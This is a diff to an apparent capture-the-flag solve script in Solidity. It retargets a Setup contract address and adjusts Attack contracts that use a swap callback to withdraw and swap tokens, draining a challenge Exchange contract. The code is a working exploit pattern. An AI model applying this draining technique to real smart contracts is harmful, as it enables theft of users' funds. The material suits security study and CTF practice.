@@ -7,7 +7,7 @@ import "forge-std/console.sol";
 import "../src/Exchange.sol";
 
 contract ExchangeSolve is Script {
-    Setup public set = Setup(0x6C2F19f878621DB7a979eFfE8c2DFffD1Cf49A76);
+    Setup public set = Setup(0x4d049491A5C3924075BcFC4BaDF67493b05699b3);
     Exchange public exchange = set.exchange();
     Token public token1 = set.token1();
     Token public token2 = set.token2();
@@ -31,6 +31,8 @@ contract ExchangeSolve is Script {
         console.log("Player balance Token1 : ", token1.balanceOf(player));
         console.log("Player balance Token2 : ", token2.balanceOf(player));
         console.log("Player balance Token3 : ", token3.balanceOf(player));
+        int256 newP = 0 - int256(200000);
+        console.log("", newP);
 
         Attack attack = new Attack(address(set));
         attack.exploit();
@@ -65,9 +67,6 @@ contract Attack is SwapCallback{
         exchange.swap();
     }
     function doSwap() public {
-        // exchange.initiateTransfer(address(token1));
-        // exchange.finalizeTransfer(address(token1));
-        // exchange.swapTokens(address(token1), address(token2), 1, 0);
 
         exchange.withdraw(address(token1), 200000);
         exchange.swapTokens(address(token1), address(token2), 200000, 0);
@@ -75,11 +74,6 @@ contract Attack is SwapCallback{
         exchange.withdraw(address(token2), 200000);
         exchange.swapTokens(address(token2), address(token3), 200000, 0);
 
-        // exchange.withdraw(address(token3), 400000);
-        // exchange.swapTokens(address(token3), address(token1), 400000, 0);
-
-        // exchange.swapTokens(address(token1), address(token2), 200000, 0);
-        // exchange.swapTokens(address(token2), address(token1), 200000, 0);
     }
 }
 
@@ -100,14 +94,7 @@ contract Attack2 is SwapCallback{
         exchange.swap();
     }
     function doSwap() public {
-
         exchange.withdraw(address(token3), 400000);
         exchange.swapTokens(address(token3), address(token1), 400000, 0);
-
-        // exchange.swapTokens(address(token1), address(token2), 200000, 0);
-        // exchange.swapTokens(address(token2), address(token1), 200000, 0);
-
-
-
     }
 }
